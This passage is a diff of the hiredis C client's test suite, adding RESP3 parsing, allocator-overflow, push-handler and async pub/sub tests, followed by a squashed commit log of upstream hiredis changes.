    \ == REDIS_ERR &&\n+              strcasecmp(reader->errstr,\"Bad bool value\"\
    ) == 0);\n+    freeReplyObject(reply);\n+    redisReaderFree(reader);\n+\n+  \
    \  test(\"Can parse RESP3 map: \");\n+    reader = redisReaderCreate();\n+   \
    \ redisReaderFeed(reader, \"%2\\r\\n+first\\r\\n:123\\r\\n$6\\r\\nsecond\\r\\\
    n#t\\r\\n\",34);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret\
    \ == REDIS_OK &&\n+        ((redisReply*)reply)->type == REDIS_REPLY_MAP &&\n\
    +        ((redisReply*)reply)->elements == 4 &&\n+        ((redisReply*)reply)->element[0]->type\
    \ == REDIS_REPLY_STATUS &&\n+        ((redisReply*)reply)->element[0]->len ==\
    \ 5 &&\n+        !strcmp(((redisReply*)reply)->element[0]->str,\"first\") &&\n\
    +        ((redisReply*)reply)->element[1]->type == REDIS_REPLY_INTEGER &&\n+ \
    \       ((redisReply*)reply)->element[1]->integer == 123 &&\n+        ((redisReply*)reply)->element[2]->type\
    \ == REDIS_REPLY_STRING &&\n+        ((redisReply*)reply)->element[2]->len ==\
    \ 6 &&\n+        !strcmp(((redisReply*)reply)->element[2]->str,\"second\") &&\n\
    +        ((redisReply*)reply)->element[3]->type == REDIS_REPLY_BOOL &&\n+    \
    \    ((redisReply*)reply)->element[3]->integer);\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n+\n+    test(\"Can parse RESP3 set: \");\n+   \
    \ reader = redisReaderCreate();\n+    redisReaderFeed(reader, \"~5\\r\\n+orange\\\
    r\\n$5\\r\\napple\\r\\n#f\\r\\n:100\\r\\n:999\\r\\n\",40);\n+    ret = redisReaderGetReply(reader,&reply);\n\
    +    test_cond(ret == REDIS_OK &&\n+        ((redisReply*)reply)->type == REDIS_REPLY_SET\
    \ &&\n+        ((redisReply*)reply)->elements == 5 &&\n+        ((redisReply*)reply)->element[0]->type\
    \ == REDIS_REPLY_STATUS &&\n+        ((redisReply*)reply)->element[0]->len ==\
    \ 6 &&\n+        !strcmp(((redisReply*)reply)->element[0]->str,\"orange\") &&\n\
    +        ((redisReply*)reply)->element[1]->type == REDIS_REPLY_STRING &&\n+  \
    \      ((redisReply*)reply)->element[1]->len == 5 &&\n+        !strcmp(((redisReply*)reply)->element[1]->str,\"\
    apple\") &&\n+        ((redisReply*)reply)->element[2]->type == REDIS_REPLY_BOOL\
    \ &&\n+        !((redisReply*)reply)->element[2]->integer &&\n+        ((redisReply*)reply)->element[3]->type\
    \ == REDIS_REPLY_INTEGER &&\n+        ((redisReply*)reply)->element[3]->integer\
    \ == 100 &&\n+        ((redisReply*)reply)->element[4]->type == REDIS_REPLY_INTEGER\
    \ &&\n+        ((redisReply*)reply)->element[4]->integer == 999);\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n+\n+    test(\"Can parse RESP3 bignum: \");\n+\
    \    reader = redisReaderCreate();\n+    redisReaderFeed(reader,\"(3492890328409238509324850943850943825024385\\\
    r\\n\",46);\n+    ret = redisReaderGetReply(reader,&reply);\n+    test_cond(ret\
    \ == REDIS_OK &&\n+        ((redisReply*)reply)->type == REDIS_REPLY_BIGNUM &&\n\
    +        ((redisReply*)reply)->len == 43 &&\n+        !strcmp(((redisReply*)reply)->str,\"\
    3492890328409238509324850943850943825024385\"));\n+    freeReplyObject(reply);\n\
    +    redisReaderFree(reader);\n }\n \n static void test_free_null(void) {\n@@\
    \ -604,13 +771,22 @@ static void *hi_calloc_fail(size_t nmemb, size_t size) {\n\
    \     return NULL;\n }\n \n+static void *hi_calloc_insecure(size_t nmemb, size_t\
    \ size) {\n+    (void)nmemb;\n+    (void)size;\n+    insecure_calloc_calls++;\n\
    +    return (void*)0xdeadc0de;\n+}\n+\n static void *hi_realloc_fail(void *ptr,\
    \ size_t size) {\n     (void)ptr;\n     (void)size;\n     return NULL;\n }\n \n\
    \ static void test_allocator_injection(void) {\n+    void *ptr;\n+\n     hiredisAllocFuncs\
    \ ha = {\n         .mallocFn = hi_malloc_fail,\n         .callocFn = hi_calloc_fail,\n\
    @@ -630,6 +806,13 @@ static void test_allocator_injection(void) {\n     redisReader\
    \ *reader = redisReaderCreate();\n     test_cond(reader == NULL);\n \n+    /*\
    \ Make sure hiredis itself protects against a non-overflow checking calloc */\n\
    +    test(\"hiredis calloc wrapper protects against overflow: \");\n+    ha.callocFn\
    \ = hi_calloc_insecure;\n+    hiredisSetAllocators(&ha);\n+    ptr = hi_calloc((SIZE_MAX\
    \ / sizeof(void*)) + 3, sizeof(void*));\n+    test_cond(ptr == NULL && insecure_calloc_calls\
    \ == 0);\n+\n     // Return allocators to default\n     hiredisResetAllocators();\n\
    \ }\n@@ -677,11 +860,25 @@ static void test_blocking_connection_errors(void) {\n\
    \ #endif\n }\n \n-/* Dummy push handler */\n-void push_handler(void *privdata,\
    \ void *reply) {\n-    int *counter = privdata;\n+/* Test push handler */\n+void\
    \ push_handler(void *privdata, void *r) {\n+    struct pushCounters *pcounts =\
    \ privdata;\n+    redisReply *reply = r, *payload;\n+\n+    assert(reply && reply->type\
    \ == REDIS_REPLY_PUSH && reply->elements == 2);\n+\n+    payload = reply->element[1];\n\
    +    if (payload->type == REDIS_REPLY_ARRAY) {\n+        payload = payload->element[0];\n\
    +    }\n+\n+    if (payload->type == REDIS_REPLY_STRING) {\n+        pcounts->str++;\n\
    +    } else if (payload->type == REDIS_REPLY_NIL) {\n+        pcounts->nil++;\n\
    +    }\n+\n     freeReplyObject(reply);\n-    *counter += 1;\n }\n \n /* Dummy\
    \ function just to test setting a callback with redisOptions */\n@@ -691,16 +888,16\
    \ @@ void push_handler_async(redisAsyncContext *ac, void *reply) {\n }\n \n static\
    \ void test_resp3_push_handler(redisContext *c) {\n+    struct pushCounters pc\
    \ = {0};\n     redisPushFn *old = NULL;\n     redisReply *reply;\n     void *privdata;\n\
    -    int n = 0;\n \n     /* Switch to RESP3 and turn on client tracking */\n \
    \    send_hello(c, 3);\n     send_client_tracking(c, \"ON\");\n     privdata =\
    \ c->privdata;\n-    c->privdata = &n;\n+    c->privdata = &pc;\n \n     reply\
    \ = redisCommand(c, \"GET key:0\");\n     assert(reply != NULL);\n@@ -717,7 +914,12\
    \ @@ static void test_resp3_push_handler(redisContext *c) {\n     old = redisSetPushCallback(c,\
    \ push_handler);\n     test(\"We can set a custom RESP3 PUSH handler: \");\n \
    \    reply = redisCommand(c, \"SET key:0 val:0\");\n-    test_cond(reply != NULL\
    \ && reply->type == REDIS_REPLY_STATUS && n == 1);\n+    test_cond(reply != NULL\
    \ && reply->type == REDIS_REPLY_STATUS && pc.str == 1);\n+    freeReplyObject(reply);\n\
    +\n+    test(\"We properly handle a NIL invalidation payload: \");\n+    reply\
    \ = redisCommand(c, \"FLUSHDB\");\n+    test_cond(reply != NULL && reply->type\
    \ == REDIS_REPLY_STATUS && pc.nil == 1);\n     freeReplyObject(reply);\n \n  \
    \   /* Unset the push callback and generate an invalidate message making\n@@ -1245,6\
    \ +1447,440 @@ static void test_throughput(struct config config) {\n //     redisFree(c);\n\
    \ // }\n \n+#ifdef HIREDIS_TEST_ASYNC\n+struct event_base *base;\n+\n+typedef\
    \ struct TestState {\n+    redisOptions *options;\n+    int           checkpoint;\n\
    +    int           resp3;\n+    int           disconnect;\n+} TestState;\n+\n\
    +/* Helper to disconnect and stop event loop */\n+void async_disconnect(redisAsyncContext\
    \ *ac) {\n+    redisAsyncDisconnect(ac);\n+    event_base_loopbreak(base);\n+}\n\
    +\n+/* Testcase timeout, will trigger a failure */\n+void timeout_cb(int fd, short\
    \ event, void *arg) {\n+    (void) fd; (void) event; (void) arg;\n+    printf(\"\
    Timeout in async testing!\\n\");\n+    exit(1);\n+}\n+\n+/* Unexpected call, will\
    \ trigger a failure */\n+void unexpected_cb(redisAsyncContext *ac, void *r, void\
    \ *privdata) {\n+    (void) ac; (void) r;\n+    printf(\"Unexpected call: %s\\\
    n\",(char*)privdata);\n+    exit(1);\n+}\n+\n+/* Helper function to publish a\
    \ message via own client. */\n+void publish_msg(redisOptions *options, const char*\
    \ channel, const char* msg) {\n+    redisContext *c = redisConnectWithOptions(options);\n\
    +    assert(c != NULL);\n+    redisReply *reply = redisCommand(c,\"PUBLISH %s\
    \ %s\",channel,msg);\n+    assert(reply->type == REDIS_REPLY_INTEGER && reply->integer\
    \ == 1);\n+    freeReplyObject(reply);\n+    disconnect(c, 0);\n+}\n+\n+/* Expect\
    \ a reply of type INTEGER */\n+void integer_cb(redisAsyncContext *ac, void *r,\
    \ void *privdata) {\n+    redisReply *reply = r;\n+    TestState *state = privdata;\n\
    +    assert(reply != NULL && reply->type == REDIS_REPLY_INTEGER);\n+    state->checkpoint++;\n\
    +    if (state->disconnect) async_disconnect(ac);\n+}\n+\n+/* Subscribe callback\
    \ for test_pubsub_handling and test_pubsub_handling_resp3:\n+ * - a published\
    \ message triggers an unsubscribe\n+ * - a command is sent before the unsubscribe\
    \ response is received. */\n+void subscribe_cb(redisAsyncContext *ac, void *r,\
    \ void *privdata) {\n+    redisReply *reply = r;\n+    TestState *state = privdata;\n\
    +\n+    assert(reply != NULL &&\n+           reply->type == (state->resp3 ? REDIS_REPLY_PUSH\
    \ : REDIS_REPLY_ARRAY) &&\n+           reply->elements == 3);\n+\n+    if (strcmp(reply->element[0]->str,\"\
    subscribe\") == 0) {\n+        assert(strcmp(reply->element[1]->str,\"mychannel\"\
    ) == 0 &&\n+               reply->element[2]->str == NULL);\n+        publish_msg(state->options,\"\
    mychannel\",\"Hello!\");\n+    } else if (strcmp(reply->element[0]->str,\"message\"\
    ) == 0) {\n+        assert(strcmp(reply->element[1]->str,\"mychannel\") == 0 &&\n\
    +               strcmp(reply->element[2]->str,\"Hello!\") == 0);\n+        state->checkpoint++;\n\
    +\n+        /* Unsubscribe after receiving the published message. Send unsubscribe\n\
    +         * which should call the callback registered during subscribe */\n+ \
    \       redisAsyncCommand(ac,unexpected_cb,\n+                          (void*)\"\
    unsubscribe should call subscribe_cb()\",\n+                          \"unsubscribe\"\
    );\n+        /* Send a regular command after unsubscribing, then disconnect */\n\
    +        state->disconnect = 1;\n+        redisAsyncCommand(ac,integer_cb,state,\"\
    LPUSH mylist foo\");\n+\n+    } else if (strcmp(reply->element[0]->str,\"unsubscribe\"\
    ) == 0) {\n+        assert(strcmp(reply->element[1]->str,\"mychannel\") == 0 &&\n\
    +               reply->element[2]->str == NULL);\n+    } else {\n+        printf(\"\
    Unexpected pubsub command: %s\\n\", reply->element[0]->str);\n+        exit(1);\n\
    +    }\n+}\n+\n+/* Expect a reply of type ARRAY */\n+void array_cb(redisAsyncContext\
    \ *ac, void *r, void *privdata) {\n+    redisReply *reply = r;\n+    TestState\
    \ *state = privdata;\n+    assert(reply != NULL && reply->type == REDIS_REPLY_ARRAY);\n\
    +    state->checkpoint++;\n+    if (state->disconnect) async_disconnect(ac);\n\
    +}\n+\n+/* Expect a NULL reply */\n+void null_cb(redisAsyncContext *ac, void *r,\
    \ void *privdata) {\n+    (void) ac;\n+    assert(r == NULL);\n+    TestState\
    \ *state = privdata;\n+    state->checkpoint++;\n+}\n+\n+static void test_pubsub_handling(struct\
    \ config config) {\n+    test(\"Subscribe, handle published message and unsubscribe:\
    \ \");\n+    /* Setup event dispatcher with a testcase timeout */\n+    base =\
    \ event_base_new();\n+    struct event *timeout = evtimer_new(base, timeout_cb,\
    \ NULL);\n+    assert(timeout != NULL);\n+\n+    evtimer_assign(timeout,base,timeout_cb,NULL);\n\
    +    struct timeval timeout_tv = {.tv_sec = 10};\n+    evtimer_add(timeout, &timeout_tv);\n\
    +\n+    /* Connect */\n+    redisOptions options = get_redis_tcp_options(config);\n\
    +    redisAsyncContext *ac = redisAsyncConnectWithOptions(&options);\n+    assert(ac\
    \ != NULL && ac->err == 0);\n+    redisLibeventAttach(ac,base);\n+\n+    /* Start\
    \ subscribe */\n+    TestState state = {.options = &options};\n+    redisAsyncCommand(ac,subscribe_cb,&state,\"\
    subscribe mychannel\");\n+\n+    /* Make sure non-subscribe commands are handled\
    \ */\n+    redisAsyncCommand(ac,array_cb,&state,\"PING\");\n+\n+    /* Start event\
    \ dispatching loop */\n+    test_cond(event_base_dispatch(base) == 0);\n+    event_free(timeout);\n\
    +    event_base_free(base);\n+\n+    /* Verify test checkpoints */\n+    assert(state.checkpoint\
    \ == 3);\n+}\n+\n+/* Unexpected push message, will trigger a failure */\n+void\
    \ unexpected_push_cb(redisAsyncContext *ac, void *r) {\n+    (void) ac; (void)\
    \ r;\n+    printf(\"Unexpected call to the PUSH callback!\\n\");\n+    exit(1);\n\
    +}\n+\n+static void test_pubsub_handling_resp3(struct config config) {\n+    test(\"\
    Subscribe, handle published message and unsubscribe using RESP3: \");\n+    /*\
    \ Setup event dispatcher with a testcase timeout */\n+    base = event_base_new();\n\
    +    struct event *timeout = evtimer_new(base, timeout_cb, NULL);\n+    assert(timeout\
    \ != NULL);\n+\n+    evtimer_assign(timeout,base,timeout_cb,NULL);\n+    struct\
    \ timeval timeout_tv = {.tv_sec = 10};\n+    evtimer_add(timeout, &timeout_tv);\n\
    +\n+    /* Connect */\n+    redisOptions options = get_redis_tcp_options(config);\n\
    +    redisAsyncContext *ac = redisAsyncConnectWithOptions(&options);\n+    assert(ac\
    \ != NULL && ac->err == 0);\n+    redisLibeventAttach(ac,base);\n+\n+    /* Not\
    \ expecting any push messages in this test */\n+    redisAsyncSetPushCallback(ac,\
    \ unexpected_push_cb);\n+\n+    /* Switch protocol */\n+    redisAsyncCommand(ac,NULL,NULL,\"\
    HELLO 3\");\n+\n+    /* Start subscribe */\n+    TestState state = {.options =\
    \ &options, .resp3 = 1};\n+    redisAsyncCommand(ac,subscribe_cb,&state,\"subscribe\
    \ mychannel\");\n+\n+    /* Make sure non-subscribe commands are handled in RESP3\
    \ */\n+    redisAsyncCommand(ac,integer_cb,&state,\"LPUSH mylist foo\");\n+  \
    \  redisAsyncCommand(ac,integer_cb,&state,\"LPUSH mylist foo\");\n+    redisAsyncCommand(ac,integer_cb,&state,\"\
    LPUSH mylist foo\");\n+    /* Handle an array with 3 elements as a non-subscribe\
    \ command */\n+    redisAsyncCommand(ac,array_cb,&state,\"LRANGE mylist 0 2\"\
    );\n+\n+    /* Start event dispatching loop */\n+    test_cond(event_base_dispatch(base)\
    \ == 0);\n+    event_free(timeout);\n+    event_base_free(base);\n+\n+    /* Verify\
    \ test checkpoints */\n+    assert(state.checkpoint == 6);\n+}\n+\n+/* Subscribe\
    \ callback for test_command_timeout_during_pubsub:\n+ * - a subscribe response\
    \ triggers a published message\n+ * - the published message triggers a command\
    \ that times out\n+ * - the command timeout triggers a disconnect */\n+void subscribe_with_timeout_cb(redisAsyncContext\
    \ *ac, void *r, void *privdata) {\n+    redisReply *reply = r;\n+    TestState\
    \ *state = privdata;\n+\n+    /* The non-clean disconnect should trigger the\n\
    +     * subscription callback with a NULL reply. */\n+    if (reply == NULL) {\n\
    +        state->checkpoint++;\n+        event_base_loopbreak(base);\n+       \
    \ return;\n+    }\n+\n+    assert(reply->type == (state->resp3 ? REDIS_REPLY_PUSH\
    \ : REDIS_REPLY_ARRAY) &&\n+           reply->elements == 3);\n+\n+    if (strcmp(reply->element[0]->str,\"\
    subscribe\") == 0) {\n+        assert(strcmp(reply->element[1]->str,\"mychannel\"\
    ) == 0 &&\n+               reply->element[2]->str == NULL);\n+        publish_msg(state->options,\"\
    mychannel\",\"Hello!\");\n+        state->checkpoint++;\n+    } else if (strcmp(reply->element[0]->str,\"\
    message\") == 0) {\n+        assert(strcmp(reply->element[1]->str,\"mychannel\"\
    ) == 0 &&\n+               strcmp(reply->element[2]->str,\"Hello!\") == 0);\n\
    +        state->checkpoint++;\n+\n+        /* Send a command that will trigger\
    \ a timeout */\n+        redisAsyncCommand(ac,null_cb,state,\"DEBUG SLEEP 3\"\
    );\n+        redisAsyncCommand(ac,null_cb,state,\"LPUSH mylist foo\");\n+    }\
    \ else {\n+        printf(\"Unexpected pubsub command: %s\\n\", reply->element[0]->str);\n\
    +        exit(1);\n+    }\n+}\n+\n+static void test_command_timeout_during_pubsub(struct\
    \ config config) {\n+    test(\"Command timeout during Pub/Sub: \");\n+    /*\
    \ Setup event dispatcher with a testcase timeout */\n+    base = event_base_new();\n\
    +    struct event *timeout = evtimer_new(base,timeout_cb,NULL);\n+    assert(timeout\
    \ != NULL);\n+\n+    evtimer_assign(timeout,base,timeout_cb,NULL);\n+    struct\
    \ timeval timeout_tv = {.tv_sec = 10};\n+    evtimer_add(timeout,&timeout_tv);\n\
    +\n+    /* Connect */\n+    redisOptions options = get_redis_tcp_options(config);\n\
    +    redisAsyncContext *ac = redisAsyncConnectWithOptions(&options);\n+    assert(ac\
    \ != NULL && ac->err == 0);\n+    redisLibeventAttach(ac,base);\n+\n+    /* Configure\
    \ a command timout */\n+    struct timeval command_timeout = {.tv_sec = 2};\n\
    +    redisAsyncSetTimeout(ac,command_timeout);\n+\n+    /* Not expecting any push\
    \ messages in this test */\n+    redisAsyncSetPushCallback(ac,unexpected_push_cb);\n\
    +\n+    /* Switch protocol */\n+    redisAsyncCommand(ac,NULL,NULL,\"HELLO 3\"\
    );\n+\n+    /* Start subscribe */\n+    TestState state = {.options = &options,\
    \ .resp3 = 1};\n+    redisAsyncCommand(ac,subscribe_with_timeout_cb,&state,\"\
    subscribe mychannel\");\n+\n+    /* Start event dispatching loop */\n+    assert(event_base_dispatch(base)\
    \ == 0);\n+    event_free(timeout);\n+    event_base_free(base);\n+\n+    /* Verify\
    \ test checkpoints */\n+    test_cond(state.checkpoint == 5);\n+}\n+\n+/* Subscribe\
    \ callback for test_pubsub_multiple_channels */\n+void subscribe_channel_a_cb(redisAsyncContext\
    \ *ac, void *r, void *privdata) {\n+    redisReply *reply = r;\n+    TestState\
    \ *state = privdata;\n+\n+    assert(reply != NULL && reply->type == REDIS_REPLY_ARRAY\
    \ &&\n+           reply->elements == 3);\n+\n+    if (strcmp(reply->element[0]->str,\"\
    subscribe\") == 0) {\n+        assert(strcmp(reply->element[1]->str,\"A\") ==\
    \ 0);\n+        publish_msg(state->options,\"A\",\"Hello!\");\n+        state->checkpoint++;\n\
    +    } else if (strcmp(reply->element[0]->str,\"message\") == 0) {\n+        assert(strcmp(reply->element[1]->str,\"\
    A\") == 0 &&\n+               strcmp(reply->element[2]->str,\"Hello!\") == 0);\n\
    +        state->checkpoint++;\n+\n+        /* Unsubscribe to channels, including\
    \ a channel X which we don't subscribe to */\n+        redisAsyncCommand(ac,unexpected_cb,\n\
    +                          (void*)\"unsubscribe should not call unexpected_cb()\"\
    ,\n+                          \"unsubscribe B X A\");\n+        /* Send a regular\
    \ command after unsubscribing, then disconnect */\n+        state->disconnect\
    \ = 1;\n+        redisAsyncCommand(ac,integer_cb,state,\"LPUSH mylist foo\");\n\
    +    } else if (strcmp(reply->element[0]->str,\"unsubscribe\") == 0) {\n+    \
    \    assert(strcmp(reply->element[1]->str,\"A\") == 0);\n+        state->checkpoint++;\n\
    +    } else {\n+        printf(\"Unexpected pubsub command: %s\\n\", reply->element[0]->str);\n\
    +        exit(1);\n+    }\n+}\n+\n+/* Subscribe callback for test_pubsub_multiple_channels\
    \ */\n+void subscribe_channel_b_cb(redisAsyncContext *ac, void *r, void *privdata)\
    \ {\n+    redisReply *reply = r;\n+    TestState *state = privdata;\n+\n+    assert(reply\
    \ != NULL && reply->type == REDIS_REPLY_ARRAY &&\n+           reply->elements\
    \ == 3);\n+\n+    if (strcmp(reply->element[0]->str,\"subscribe\") == 0) {\n+\
    \        assert(strcmp(reply->element[1]->str,\"B\") == 0);\n+        state->checkpoint++;\n\
    +    } else if (strcmp(reply->element[0]->str,\"unsubscribe\") == 0) {\n+    \
    \    assert(strcmp(reply->element[1]->str,\"B\") == 0);\n+        state->checkpoint++;\n\
    +    } else {\n+        printf(\"Unexpected pubsub command: %s\\n\", reply->element[0]->str);\n\
    +        exit(1);\n+    }\n+}\n+\n+/* Test handling of multiple channels\n+ *\
    \ - subscribe to channel A and B\n+ * - a published message on A triggers an unsubscribe\
    \ of channel B, X and A\n+ *   where channel X is not subscribed to.\n+ * - a\
    \ command sent after unsubscribe triggers a disconnect */\n+static void test_pubsub_multiple_channels(struct\
    \ config config) {\n+    test(\"Subscribe to multiple channels: \");\n+    /*\
    \ Setup event dispatcher with a testcase timeout */\n+    base = event_base_new();\n\
    +    struct event *timeout = evtimer_new(base,timeout_cb,NULL);\n+    assert(timeout\
    \ != NULL);\n+\n+    evtimer_assign(timeout,base,timeout_cb,NULL);\n+    struct\
    \ timeval timeout_tv = {.tv_sec = 10};\n+    evtimer_add(timeout,&timeout_tv);\n\
    +\n+    /* Connect */\n+    redisOptions options = get_redis_tcp_options(config);\n\
    +    redisAsyncContext *ac = redisAsyncConnectWithOptions(&options);\n+    assert(ac\
    \ != NULL && ac->err == 0);\n+    redisLibeventAttach(ac,base);\n+\n+    /* Not\
    \ expecting any push messages in this test */\n+    redisAsyncSetPushCallback(ac,unexpected_push_cb);\n\
    +\n+    /* Start subscribing to two channels */\n+    TestState state = {.options\
    \ = &options};\n+    redisAsyncCommand(ac,subscribe_channel_a_cb,&state,\"subscribe\
    \ A\");\n+    redisAsyncCommand(ac,subscribe_channel_b_cb,&state,\"subscribe B\"\
    );\n+\n+    /* Start event dispatching loop */\n+    assert(event_base_dispatch(base)\
    \ == 0);\n+    event_free(timeout);\n+    event_base_free(base);\n+\n+    /* Verify\
    \ test checkpoints */\n+    test_cond(state.checkpoint == 6);\n+}\n+\n+/* Command\
    \ callback for test_monitor() */\n+void monitor_cb(redisAsyncContext *ac, void\
    \ *r, void *privdata) {\n+    redisReply *reply = r;\n+    TestState *state =\
    \ privdata;\n+\n+    /* NULL reply is received when BYE triggers a disconnect.\
    \ */\n+    if (reply == NULL) {\n+        event_base_loopbreak(base);\n+     \
    \   return;\n+    }\n+\n+    assert(reply != NULL && reply->type == REDIS_REPLY_STATUS);\n\
    +    state->checkpoint++;\n+\n+    if (state->checkpoint == 1) {\n+        /*\
    \ Response from MONITOR */\n+        redisContext *c = redisConnectWithOptions(state->options);\n\
    +        assert(c != NULL);\n+        redisReply *reply = redisCommand(c,\"SET\
    \ first 1\");\n+        assert(reply->type == REDIS_REPLY_STATUS);\n+        freeReplyObject(reply);\n\
    +        redisFree(c);\n+    } else if (state->checkpoint == 2) {\n+        /*\
    \ Response for monitored command 'SET first 1' */\n+        assert(strstr(reply->str,\"\
    first\") != NULL);\n+        redisContext *c = redisConnectWithOptions(state->options);\n\
    +        assert(c != NULL);\n+        redisReply *reply = redisCommand(c,\"SET\
    \ second 2\");\n+        assert(reply->type == REDIS_REPLY_STATUS);\n+       \
    \ freeReplyObject(reply);\n+        redisFree(c);\n+    } else if (state->checkpoint\
    \ == 3) {\n+        /* Response for monitored command 'SET second 2' */\n+   \
    \     assert(strstr(reply->str,\"second\") != NULL);\n+        /* Send QUIT to\
    \ disconnect */\n+        redisAsyncCommand(ac,NULL,NULL,\"QUIT\");\n+    }\n\
    +}\n+\n+/* Test handling of the monitor command\n+ * - sends MONITOR to enable\
    \ monitoring.\n+ * - sends SET commands via separate clients to be monitored.\n\
    + * - sends QUIT to stop monitoring and disconnect. */\n+static void test_monitor(struct\
    \ config config) {\n+    test(\"Enable monitoring: \");\n+    /* Setup event dispatcher\
    \ with a testcase timeout */\n+    base = event_base_new();\n+    struct event\
    \ *timeout = evtimer_new(base, timeout_cb, NULL);\n+    assert(timeout != NULL);\n\
    +\n+    evtimer_assign(timeout,base,timeout_cb,NULL);\n+    struct timeval timeout_tv\
    \ = {.tv_sec = 10};\n+    evtimer_add(timeout, &timeout_tv);\n+\n+    /* Connect\
    \ */\n+    redisOptions options = get_redis_tcp_options(config);\n+    redisAsyncContext\
    \ *ac = redisAsyncConnectWithOptions(&options);\n+    assert(ac != NULL && ac->err\
    \ == 0);\n+    redisLibeventAttach(ac,base);\n+\n+    /* Not expecting any push\
    \ messages in this test */\n+    redisAsyncSetPushCallback(ac,unexpected_push_cb);\n\
    +\n+    /* Start monitor */\n+    TestState state = {.options = &options};\n+\
    \    redisAsyncCommand(ac,monitor_cb,&state,\"monitor\");\n+\n+    /* Start event\
    \ dispatching loop */\n+    test_cond(event_base_dispatch(base) == 0);\n+    event_free(timeout);\n\
    +    event_base_free(base);\n+\n+    /* Verify test checkpoints */\n+    assert(state.checkpoint\
    \ == 3);\n+}\n+#endif /* HIREDIS_TEST_ASYNC */\n+\n int main(int argc, char **argv)\
    \ {\n     struct config cfg = {\n         .tcp = {\n@@ -1363,6 +1999,24 @@ int\
    \ main(int argc, char **argv) {\n     }\n #endif\n \n+#ifdef HIREDIS_TEST_ASYNC\n\
    +    printf(\"\\nTesting asynchronous API against TCP connection (%s:%d):\\n\"\
    , cfg.tcp.host, cfg.tcp.port);\n+    cfg.type = CONN_TCP;\n+\n+    int major;\n\
    +    redisContext *c = do_connect(cfg);\n+    get_redis_version(c, &major, NULL);\n\
    +    disconnect(c, 0);\n+\n+    test_pubsub_handling(cfg);\n+    test_pubsub_multiple_channels(cfg);\n\
    +    test_monitor(cfg);\n+    if (major >= 6) {\n+        test_pubsub_handling_resp3(cfg);\n\
    +        test_command_timeout_during_pubsub(cfg);\n+    }\n+#endif /* HIREDIS_TEST_ASYNC\
    \ */\n+\n     if (test_inherit_fd) {\n         printf(\"\\nTesting against inherited\
    \ fd (%s): \", cfg.unix_sock.path);\n         if (test_unix_socket) {"
  commit_message: 'Squashed ''deps/hiredis/'' changes from 00272d669..f8de9a4bd


    f8de9a4bd Merge pull request #1046 from redis/rockylinux-ci

    a41c9bc8b CentOS 8 is EOL, switch to RockyLinux

    be41ed60d Avoid incorrect call to the previous reply''s callback (#1040)

    f2e8010d9 fix building on AIX and SunOS (#1031)

    e73ab2f23 Add timeout support for libuv adapter (#1016)

    f2ce5980e Allow sending commands after sending an unsubscribe (#1036)

    ff860e55d Correction for command timeout during pubsub (#1038)

    24d534493 CMakeLists.txt: allow building without a C++ compiler (#872)

    4ece9a02e Fix adapters/libevent.h compilation for 64-bit Windows (#937)

    799edfaad Don''t link with crypto libs if USE_SSL isn''t set.

    f74b08182 Makefile: move SSL options into a block and refine rules

    f347743b7 Update CMakeLists.txt for more portability (#1005)

    f2be74802 Fix integer overflow when format command larger than 4GB (#1030)

    58aacdac6 Handle array response in parallell with pubsub using RESP3 (#1014)

    d3384260e Support PING while subscribing (RESP2) (#1027)

    e3a479e40 FreeBSD build fixes + CI (#1026)

    da5a4ff36 Add asynchronous test for pubsub using RESP3 (#1012)

    b5716ee82 Valgrind returns error exit code when errors found (#1011)

    1aed21a8c Move to using make directly in Cygwin (#1020)

    a83f4b890 Correct CMake warning for libevent adapter example

    c4333203e Remove unused parameter warning in libev adapter

    7ad38dc4a Small tweaks of the async tests

    4021726a6 Add asynchronous test for pubsub using RESP2

    648763c36 Add build options for enabling async tests

    c98c6994d Correcting the build target `coverage` for enabled SSL (#1009)

    30ff8d850 Run SSL tests in CI

    4a126e8a9 Add valgrind and CMake to tests

    b73c2d410 Add Centos8

    e9f647384 We should run actions on PRs

    6ad4ccf3c Add Cygwin build test

    783a3789c Add Windows tests in GitHub actions

    0cac8dae1 Switch to GitHub actions

    fa900ef76 Fix unused variable warning.

    e489846b7 Minor refactor of CVE-2021-32765 fix.

    51c740824 Remove extra comma from cmake var. Or it''ll be treated as part of the
    var name.

    632bf0718 Merge branch ''release/v1.0.2''

    b73128324 Prepare for v1.0.2 GA

    d4e6f109a Revert erroneous SONAME bump

    a39824a5d Merge branch ''release/v1.0.1''

    8d1bfac46  Prepare for v1.0.1 GA

    76a7b1000 Fix for integer/buffer overflow CVE-2021-32765

    9eca1f36f Allow to override OPENSSL_PREFIX in Linux

    2d9d77518 Don''t leak memory if an invalid type is set (#906)

    f5f31ff9b Added REDIS_NO_AUTO_FREE_REPLIES flag (#962)

    5850a8ecd Ensure we curry any connect error to an async context.

    b6f86f38c Fix README.md

    667dbf536 Merge pull request #935 from kristjanvalur/pr5

    9bf6c250e Merge pull request #939 from zmartzone/improve_pr_896_ssl_leak

    959af9760 Merge pull request #949 from plan-do-break-fix/Typo-corrections

    0743f57bb fix(docs): corrects typos in project README

    5f4382247 improve SSL leak fix redis/hiredis#896

    e06ecf7e4 Ignore timeout callback from a successful connect

    dfa33e60b Change order independant push logic to not change behavior.

    6204182aa Handle the case where an invalidation is sent second.

    d6a0b192b Merge branch ''reader-updates''

    410c24d2a Fix off-by-one error in seekNewline

    bd7488d27 read: Validate line items prior to checking for object creation callbacks

    5f9242a1f read: Remove obsolete comment on nested multi bulk depth limitation

    83c145042 read: Add support for the RESP3 bignum type

    c6646cb19 read: Ensure no invalid ''\r'' or ''\n'' in simple status/error strings

    e43061156 read: Additional validation and test case for RESP3 double

    c8adea402 redisReply: Fix parent type assertions during double, nil, bool creation

    ff73f1f9e redisReply: Explicitly list nil and bool cases in freeReplyObject()
    switch.

    0f9251884 test: Add test case for RESP3 set

    33c06dd50 test: Add test case for RESP3 map

    397fe2630 read: Use memchr() in seekNewline() instead of looping over entire string

    81c48a982 test: Add test cases for RESP3 bool

    51e693f4f read: Add additional RESP3 bool validation

    790b4d3b4 test: Add test cases for RESP3 nil

    d8899fbc1 read: Add additional RESP3 nil validation

    96e8ea611 test: Add test cases for infinite and NaN doubles

    f913e9b99 read: Fix double validation and infinity parsing

    8039c7d26 test: Add test case for doubles

    49539fd1a redisReply: Fix - set len in double objects

    53a8144c8 Merge pull request #924 from cheese1/master

    9390de006 http -> https

    7d99b5635 Merge pull request #917 from Nordix/stack-alloc-dict-iter

    4bba72103 Handle OOM during async command callback registration

    920128a26 Stack allocate dict iterators

